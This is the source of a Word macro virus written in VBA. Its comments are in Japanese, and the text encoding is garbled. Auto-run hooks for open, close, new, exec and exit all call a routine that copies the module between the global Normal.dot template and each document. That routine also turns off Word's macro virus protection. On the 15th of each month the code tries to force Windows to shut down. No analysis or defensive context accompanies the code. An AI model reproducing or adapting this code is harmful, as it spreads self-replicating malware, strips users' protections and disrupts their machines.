   Attribute VB_Name = "MacrosVirus"
   '
   'MacroVirus
   'DOS/V(c:\)‚ð‘O’ñ‚É*ì*¬
   '
   'Declare Function ExitWindows Lib "user32" (ByVal dwReturnCode As Long, ByVal wReserved As Integer) As Integer
   Option Explicit
   Sub autoexec()
       Call virus
       MsgBox Year(Now) & "”N" & Month(Now) & "ŒŽ" & Day(Now) & "“ú"
   '–ˆŒŽ‚P‚T“ú‚Í‹*§*I—¹
       If Day(Now) = 15 Then
           Tasks.ExitWindows
       End If
   End Sub
   Sub autoexit()
       Call virus
   End Sub
   Sub autonew()
       Call virus
   End Sub
   Sub autoopen()
       Call virus
   End Sub
   Sub autoclose()
       Call virus
   End Sub
   Sub virus()
       On Error Resume Next
       Dim fname
       Set fname = Documents.item(1)
   'Normal.dot‚©‚çƒtƒ@ƒCƒ‹‚Öƒ}ƒNƒ*‚ðƒRƒs*[
       Application.OrganizerCopy Source:="c:\Program Files\Microsoft Office\Template\Normal.dot", Destination:=fname, Name:="MacrosVirus", Object:=wdOrganizerObjectProjectItems
   'Š´*õƒtƒ@ƒCƒ‹‚©‚çNormal.dot‚Öƒ}ƒNƒ*‚ðƒRƒs*[
       Documents(fname).Activate
       Application.OrganizerCopy Source:=CurDir + "\" + fname, Destination:="c:\Program Files\Microsoft Office\Template\Normal.dot", Name:="MacrosVirus", Object:=wdOrganizerObjectProjectItems
   'ƒEƒCƒ‹ƒXƒ`ƒFƒbƒN‚ð‚Í‚¸‚·
       Options.VirusProtection = False
   End Sub
